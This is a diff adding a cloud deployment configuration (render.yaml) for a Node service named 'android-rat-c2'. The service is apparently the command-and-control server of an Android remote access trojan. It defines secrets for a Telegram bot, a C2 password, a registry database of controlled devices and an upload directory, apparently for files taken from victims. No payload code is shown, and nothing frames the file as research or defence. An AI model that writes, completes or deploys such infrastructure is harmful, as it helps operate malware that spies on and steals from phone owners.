@@ -1,0 +1,23 @@
+services:
+  - type: web
+    name: android-rat-c2
+    runtime: node
+    repo: https://github.com/YOUR_USER/android-rat
+    plan: free
+    region: ohio
+    buildCommand: npm install
+    startCommand: npm start
+    healthCheckPath: /health
+    envVars:
+      - key: NODE_ENV
+        value: production
+      - key: TELEGRAM_BOT_TOKEN
+        sync: false
+      - key: TELEGRAM_CHAT_ID
+        sync: false
+      - key: C2_PASSWORD
+        sync: false
+      - key: DB_PATH
+        value: /data/c2-registry.db
+      - key: UPLOAD_DIR
+        value: /data/uploads
